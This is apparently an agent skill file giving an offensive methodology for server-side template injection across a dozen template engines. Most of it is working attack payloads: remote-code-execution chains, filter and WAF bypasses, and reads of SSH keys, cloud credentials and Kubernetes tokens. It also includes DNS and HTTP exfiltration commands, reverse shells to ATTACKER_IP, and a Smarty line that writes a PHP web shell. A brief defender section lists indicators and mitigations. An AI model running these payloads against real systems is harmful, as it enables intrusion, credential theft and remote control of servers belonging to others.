---
name: offensive-ssti
description: "Dense description covering Server-Side Template Injection across Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, Mako, Handlebars, ERB, Thymeleaf, EJS, Pug. Engine fingerprinting, filter bypass, blind exploitation, WAF evasion, SSTI-to-RCE chains. Tools: tplmap. CWE-1336. MITRE T1190. Use when testing template rendering endpoints or exploiting template injection for code execution."
---

# Server-Side Template Injection (SSTI) -- Offensive Methodology

SSTI exists wherever user-controlled input is concatenated into a server-side
template string and the engine evaluates it as code. The engine executes
attacker-supplied directives, granting access to the language runtime and, in
nearly every engine, remote code execution through the host language's object
model. You encounter SSTI in any application passing raw user input to functions
like `render_template_string()`, `Template()`, or `compile()`.

CWE-1336. MITRE ATT&CK T1190.

## Quick Workflow

1. Map injection surfaces: URL params, POST bodies, JSON values, path segments, headers, cookies.
2. Inject polyglot probes and engine-specific arithmetic expressions; note evaluation, errors, or blank output.
3. Fingerprint the engine via decision-tree probes, error signatures, and variable enumeration (section 1).
4. Confirm server-side execution -- rule out client-side template injection (AngularJS, Vue.js).
5. Escalate to information disclosure: dump config, env vars, secrets, internal paths.
6. Achieve code execution with the engine-specific chain; apply bypass techniques if blocked (section 6).
7. Chain for higher impact: file read, SSRF to cloud metadata, reverse shell, internal pivot.
8. Produce non-destructive PoC with unique marker and capture the full request/response chain.

---

## 1. Engine Detection and Fingerprinting

### 1.1 Polyglot Probes

```text
${{<%[%'"}}%\          Universal polyglot
{{7*7}}                Double-curly arithmetic
{{7*'7'}}              String multiplication (Jinja2 returns 7777777, Twig returns 49)
<%= 7*7 %>             ERB / EJS style
#{7*7}                 Pebble / Pug / Thymeleaf contexts
@(7+7)                 Razor (.NET)
```

Engine-narrowing probes:

```text
{{config}}             Jinja2/Flask config dict
{{_self.env}}          Twig Environment object
{$smarty.version}      Smarty version string
<#assign x=1>          Freemarker (then reference x in dollar-curly)
```

For Velocity, inject `#set( $x = 7 * 7 )` then reference `$x`.
For Thymeleaf/SpEL, inject a dollar-curly expression with `T(java.lang.Math).PI`.
For Mako, inject a dollar-curly expression with `self.module.__name__`.

### 1.2 Decision Tree

```text
{{7*7}} --> 49?
  YES --> {{7*'7'}} --> "7777777"? --> Jinja2/Nunjucks ({{config}} narrows to Flask)
                    --> "49"?      --> Twig
                    --> error?     --> Handlebars
  NO  --> dollar-curly with 7*7 --> 49?
            YES --> dollar-curly with class ref   --> Velocity
                    dollar-curly with T(Math).PI  --> Thymeleaf
                    <#assign x=1> then ref x      --> Freemarker
                    error contains "mako"         --> Mako
            NO  --> <%= 7*7 %> --> 49?
                      error with "erb"/"Erubi"    --> ERB
                      error with "ejs"            --> EJS
                    @(7+7) --> 14?                --> Razor
```

### 1.3 Error Signatures

| Signature                                        | Engine     |
|--------------------------------------------------|------------|
| `jinja2.exceptions.UndefinedError`               | Jinja2     |
| `Twig\Error\SyntaxError`                         | Twig       |
| `freemarker.core.ParseException`                 | Freemarker |
| `org.apache.velocity.exception`                  | Velocity   |
| `com.mitchellbosecke.pebble.error`               | Pebble     |
| `SmartyCompilerException`                        | Smarty     |
| `mako.exceptions.SyntaxException`                | Mako       |
| `Parse error` with Handlebars context            | Handlebars |
| `SyntaxError` with ERB path                      | ERB        |
| `org.thymeleaf.exceptions.TemplateProcessing`    | Thymeleaf  |
| `SyntaxError` with `.ejs` path                   | EJS        |
| `Pug:Error`                                      | Pug        |

### 1.4 Blind Detection

**Time-based:** `{{range(99999999)|join}}` (Jinja2), `<%= sleep(5) %>` (ERB).
For Java engines, inject a dollar-curly with `T(java.lang.Thread).sleep(5000)`.

**OOB DNS:** Use Burp Collaborator or interactsh. Jinja2:
`{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup UNIQUE.oastify.com').read()}}`.
Twig: `{{['nslookup UNIQUE.oastify.com']|map('system')}}`.

**Error inference:** Compare `{{7*7}}` vs `{{7*'INVALID}}` -- different response
behavior confirms processing.

---

## 2. Jinja2 / Python

Exploitation relies on MRO traversal to `object`, subclass enumeration, and
`__globals__`/`__builtins__` access.

### 2.1 MRO Traversal and Subclass Enumeration

```python
{{''.__class__.__mro__[1]}}                    # Reach object base class
{{''.__class__.__mro__[1].__subclasses__()}}   # List all subclasses

# Find subprocess.Popen index (varies by Python version -- never hardcode)
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}{{ loop.index0 }}{% endif %}
{% endfor %}
```

### 2.2 RCE Chains

```python
# Via subprocess.Popen (replace INDEX with runtime value)
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}

# Via self.__init__.__globals__
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via request.application (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via config object
{{config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via cycler (bypasses some sandboxes)
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Via lipsum / namespace / joiner globals
{{lipsum.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Via warnings module search
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}
```

### 2.3 File Ops and Info Disclosure

```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}    # Read file
{{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/x','w').write('y')}} # Write file
{{config}}                                                                # Flask config
{{config['SQLALCHEMY_DATABASE_URI']}}                                     # DB URI
{{request.environ}}                                                       # WSGI env
```

---

## 3. Twig / PHP

### 3.1 Legacy (Twig 1.x) -- _self.env

```php
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}
```

### 3.2 Modern (Twig 2.x/3.x) -- Filter Callbacks

```php
{{'id'|filter('system')}}                  # filter() with system
{{'id'|filter('passthru')}}                # filter() with passthru
{{['id']|map('system')|join}}              # map() callback
{{['id',0]|sort('system')|join}}           # sort() callback
{{[0,'id']|reduce('system')}}              # reduce() callback
```

### 3.3 Info Disclosure

```php
{{app.request.server.all|join(',')}}       # Symfony server vars
{{dump(app)}}                              # Full app dump
{{'/etc/passwd'|file_excerpt(1,100)}}      # File read (debug mode)
{{'/etc/passwd'|file_get_contents}}        # If exposed as filter
```

---

## 4. Java Template Engines

### 4.1 Freemarker -- Execute and ObjectConstructor

RCE via the Execute class -- use `<#assign>` to instantiate it, then reference
it in a dollar-curly expression with the command string as argument:

```http
GET /page?input=%3C%23assign+cmd%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bcmd(%22id%22)%7D HTTP/1.1
Host: target.example.com
```

ObjectConstructor for ProcessBuilder:

```html
<#assign obj = "freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb = obj("java.lang.ProcessBuilder", ["sh","-c","id"])>
<#assign proc = pb.start()>
```

### 4.2 Velocity -- Runtime.exec

```java
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
#set($process = $runtime.exec("id"))
#set($s = $class.inspect("java.util.Scanner").type)
#set($sc = $s.getDeclaredConstructor($process.getInputStream().getClass()).newInstance($process.getInputStream()))
$sc.useDelimiter("\\A").next()
```

### 4.3 Pebble -- Reflection Chain

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}
```

### 4.4 Thymeleaf -- SpEL via Preprocessing

Thymeleaf preprocessing evaluates double-underscore-wrapped expressions before
template resolution. Inject into path variables or parameters:

```http
GET /page/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x HTTP/1.1
Host: target.example.com
```

File read:

```http
GET /page/__${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}__::.x HTTP/1.1
Host: target.example.com
```

SpEL keyword bypass via Character references:
`T(Character).toString(105).concat(T(Character).toString(100))` produces `id`.

Spring bean access: `@environment.getProperty('spring.datasource.password')`.

---

## 5. Other Engines

### 5.1 Smarty (PHP)

```php
{$smarty.version}                           # Version disclosure
{php}echo shell_exec('id');{/php}           # If {php} tags enabled (legacy)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
{math equation="(\"\\x73\\x79\\x73\\x74\\x65\\x6d\")(\"id\")"}
```

### 5.2 Mako (Python)

Mako compiles to Python modules with full runtime access. Block-style:

```python
<% import os; result = os.popen('id').read() %>
```

Then output the variable in a dollar-curly expression. URL-encoded single-line:

```http
GET /page?name=%24%7Bself.module.cache.util.os.popen('id').read()%7D HTTP/1.1
Host: target.example.com
```

### 5.3 ERB (Ruby)

```ruby
<%= system("id") %>                                     # Command exec
<%= `id` %>                                             # Backtick exec
<%= File.open('/etc/passwd').read() %>                  # File read
<%= Rails.application.credentials.secret_key_base %>    # Rails secrets
<%= require 'socket'; f=TCPSocket.open("ATTACKER",4444).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f) %>
```

### 5.4 Handlebars (Node.js)

Logic-less by design; RCE requires prototype pollution or unsafe helpers:

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}{{#with split as |conslist|}}
    {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}
      {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
    {{/with}}
  {{/with}}{{/with}}
{{/with}}
```

### 5.5 EJS (Node.js)

```javascript
<%= global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
```

Prototype pollution via `outputFunctionName`:

```http
POST /render HTTP/1.1
Content-Type: application/json

{"settings":{"view options":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}
```

### 5.6 Pug / Nunjucks (Node.js)

Pug:

```javascript
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
p= x
```

Nunjucks:

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

---

## 6. Filter and WAF Bypass

### 6.1 Character Restriction Bypass (Jinja2)

```python
# Dot blocked -- use |attr() or brackets
{{request|attr('application')}}
{{request['application']}}

# Underscore blocked -- hex encode (\x5f = _)
{{''['\x5f\x5fclass\x5f\x5f']}}
# Or pass via request param: ?a=__class__
{{''|attr(request.args.a)}}

# Brackets/quotes blocked -- chain |attr() with request.args
# URL: ?a=__class__&b=__mro__&c=__subclasses__
{{()|attr(request.args.a)|attr(request.args.b)|last|attr(request.args.c)()}}
```

### 6.2 String Construction

```python
# Tilde concatenation
{{''|attr('__cla'~'ss__')}}

# Join filter
{{''|attr(['__cla','ss__']|join)}}

# Plus in brackets
{{''['__cla'+'ss__']}}

# chr() construction
{% set chr = ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__.__builtins__.chr %}
{{''[chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)]}}

# Twig tilde
{{('sys'~'tem')('id')}}
```

### 6.3 Attribute Access Alternatives

```python
{{obj|attr('__class__')}}                   # |attr() filter
{{obj.__getattribute__('__class__')}}       # __getattribute__
{{obj['__class__']}}                        # bracket notation
{{obj|attr('__getitem__')('key')}}          # |attr() + __getitem__
```

### 6.4 Encoding and Smuggling

```python
# Hex/octal encoding
{{request['\x5f\x5fclass\x5f\x5f']}}
{{request|attr('\137\137class\137\137')}}

# Request parameter smuggling
# URL: ?c=__class__
{{request|attr(request.args.c)}}
# URL: ?f=%s%sclass%s%s&a=_
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}
# URL: ?l=a&a=_&a=_&a=class&a=_&a=_
{{request|attr(request.args.getlist(request.args.l)|join)}}
```

### 6.5 WAF Evasion Techniques

```text
Parameter splitting:     ?a={{&b=7*7&c=}}
HTTP Param Pollution:    ?name={{7*7}}&name=safe (backend takes first, WAF last)
Content-Type confusion:  Submit as application/json when WAF inspects form-urlencoded
Double URL encoding:     %257B%257B7*7%257D%257D
Whitespace injection:    {{ 7 * 7 }}, {%- if 1 -%}49{%- endif -%}
Newline injection:       {{\n7*7\n}} (WAFs may not match cross-line patterns)
```

### 6.6 Engine-Specific Bypass

Freemarker -- when `?new()` is restricted, use ObjectConstructor:

```html
<#assign obj = "freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb = obj("java.lang.ProcessBuilder", ["sh","-c","id"])>
```

Thymeleaf -- build strings from `T(Character).toString()` calls to avoid keyword filters.

---

## 7. Blind Exploitation

### 7.1 Time-Based

```python
{{range(99999999)|join}}                   # Jinja2: CPU-intensive delay

{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('time').sleep(5)}}
  {% endif %}
{% endfor %}                               # Jinja2: explicit sleep
```

```php
{{['sleep 5']|map('system')}}             # Twig
```

```ruby
<%= sleep(5) %>                            # ERB
```

Freemarker: assign Execute, invoke with `"sleep 5"`. Thymeleaf: dollar-curly
with `T(java.lang.Thread).sleep(5000)` in preprocessing wrapper.

### 7.2 OOB DNS Callbacks

```python
# Jinja2 -- confirm execution
{{self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://UNIQUE.oastify.com').read()}}

# Jinja2 -- exfiltrate data in subdomain
{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup $(whoami).UNIQUE.oastify.com').read()}}
```

```php
{{['curl http://UNIQUE.oastify.com']|map('system')}}    # Twig
```

```ruby
<%= `nslookup #{`whoami`.chomp}.UNIQUE.oastify.com` %>   # ERB
```

### 7.3 Error and Boolean Inference

```python
{{config.__class__.__name__ + 1}}          # Type error leaks data in error page
{{1/0}}                                    # Division by zero with engine info

# Boolean blind -- extract character by character
{% if ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()[0] == 'r' %}TRUE{% endif %}
```

---

## 8. Chained Exploitation

### 8.1 SSTI to SSRF

```python
# Cloud metadata
{{self.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}

# Internal service access
{{self.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://internal-api:8080/admin').read()}}
```

### 8.2 SSTI to File Read

```python
{{''.__class__.__mro__[1].__subclasses__()[40]('app.py').read()}}                               # Source code
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/config/database.yml').read()}}          # DB creds
{{''.__class__.__mro__[1].__subclasses__()[40]('/home/app/.ssh/id_rsa').read()}}                 # SSH keys
{{''.__class__.__mro__[1].__subclasses__()[40]('/home/app/.aws/credentials').read()}}            # AWS creds
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/run/secrets/kubernetes.io/serviceaccount/token').read()}}  # K8s token
{{''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read()}}                    # Process env
```

### 8.3 SSTI to Reverse Shell

Jinja2:
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```

Freemarker: assign Execute, invoke with
`bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}`.

ERB:
```ruby
<%= require 'socket'; f=TCPSocket.open("ATTACKER_IP",4444).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f) %>
```

### 8.4 SSTI to Privesc Enumeration

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id && groups').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('sudo -l 2>&1').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('find / -perm -4000 -type f 2>/dev/null').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('uname -a').read()}}
```

### 8.5 SSTI to Data Exfiltration

```python
# Chunked DNS exfil
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd | base64 -w0 | cut -c1-60 | xargs -I{} nslookup {}.UNIQUE.oastify.com').read()}}

# HTTP POST exfil
{{self.__init__.__globals__.__builtins__.__import__('os').popen('curl -X POST -d @/etc/passwd http://ATTACKER/exfil').read()}}
```

---

## Detection / Defender View

**Indicators of Attack:**
- Template delimiters in input: `{{`, `{%`, `<%`, `#{`, `#set(`, `<#assign`.
- MRO strings: `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`.
- Java reflection: `getRuntime`, `ProcessBuilder`, `forName`, `T(java.lang`.
- Template errors in responses from user-triggered requests.

**Indicators of Compromise:**
- Unexpected child processes from web workers (`sh`, `bash`, `curl`, `nslookup`).
- New files in `/tmp` or web root created by the app process.
- Outbound connections to callback services or unfamiliar IPs.
- Cloud metadata access from containers that should not query 169.254.169.254.

**Prevention:**
- Never concatenate user input into template strings -- use template variables.
- Block dangerous APIs in CI: `render_template_string()`, `Template()` with
  user input, `Environment.from_string()`.
- Enable sandboxing: Jinja2 `SandboxedEnvironment`, Freemarker `SAFER_RESOLVER`.
- Restrict Twig filters/functions to a safe allowlist.
- Disable `{php}` in Smarty, `compileDebug` in EJS, SpEL preprocessing in Thymeleaf.
- Run apps with minimal privileges, seccomp/AppArmor, read-only root filesystems.
- WAF rules as defense-in-depth (see section 6 for bypass techniques).
- Track CVEs: CVE-2024-22195 (Jinja2 xmlattr bypass), CVE-2024-46507 (Yeti RCE).

---

## Engagement Cheatsheet

| Phase          | Action                                    | Tool / Technique                   |
|----------------|-------------------------------------------|------------------------------------|
| Recon          | Map input reflection points               | Burp Suite, waybackurls, qsreplace |
| Detection      | Inject polyglot and arithmetic probes     | ffuf, Burp Intruder, manual        |
| Fingerprinting | Identify engine via decision tree/errors  | Error signatures, variable probes  |
| Validation     | Confirm server-side execution             | Timing, source inspection          |
| Exploitation   | Apply engine-specific RCE chain           | tplmap, SSTImap, TInjA, manual     |
| Bypass         | Evade WAF/filters                         | Section 6 techniques               |
| Blind          | OOB, time-based, error-based methods      | Burp Collaborator, interactsh      |
| Escalation     | Chain to file read, SSRF, shell, privesc  | Section 8 chains                   |
| Proof          | Non-destructive PoC with unique marker    | DNS callback, unique file          |

### Tool Quick Reference

```bash
# tplmap
python tplmap.py -u 'http://target.example.com/page?name=test'              # Basic scan
python tplmap.py -u 'http://target.example.com/page?name=test' -e jinja2    # Force engine
python tplmap.py -u 'http://target.example.com/page' -d 'name=test'         # POST injection
python tplmap.py -u 'http://target.example.com/page?name=test' --os-cmd id  # Execute command
python tplmap.py -u 'http://target.example.com/page?name=test' --os-shell   # Interactive shell

# SSTImap
python3 sstimap.py -u 'https://target.example.com/page?name=test'           # Auto-detect
python3 sstimap.py -u 'https://target.example.com/page?name=test' -S        # Shell
python3 sstimap.py -u 'https://target.example.com/page?name=test' -C 'id'   # Run command

# Parameter discovery
waybackurls http://target.example.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"
arjun -u http://target.example.com/page --stable
```

---

## Key References

- PortSwigger Research: https://portswigger.net/research/server-side-template-injection
- PortSwigger SSTI Labs: https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- tplmap: https://github.com/epinna/tplmap
- SSTImap: https://github.com/vladko312/SSTImap
- TInjA: https://github.com/Hackmanit/TInjA
- Jinja2 Sandbox: https://jinja.palletsprojects.com/en/3.1.x/sandbox/
- Spring SpEL: https://docs.spring.io/spring-framework/reference/core/expressions.html
- Freemarker Security: https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
- OWASP SSTI Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- CWE-1336: https://cwe.mitre.org/data/definitions/1336.html
